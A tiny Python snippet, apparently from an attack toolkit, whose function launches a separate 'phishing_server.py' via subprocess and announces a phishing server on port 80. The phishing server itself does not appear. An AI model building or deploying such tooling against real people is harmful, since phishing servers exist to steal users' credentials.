import subprocess

def start_phishing():
    try:
        # Lancer le serveur Flask (tu devras créer phishing_server.py)
        cmd = "python3 phishing_server.py"
        subprocess.Popen(cmd, shell=True)
        return "[+] Phishing server started on http://0.0.0.0:80"
    except Exception as e:
        return f"[ERROR] {e}"
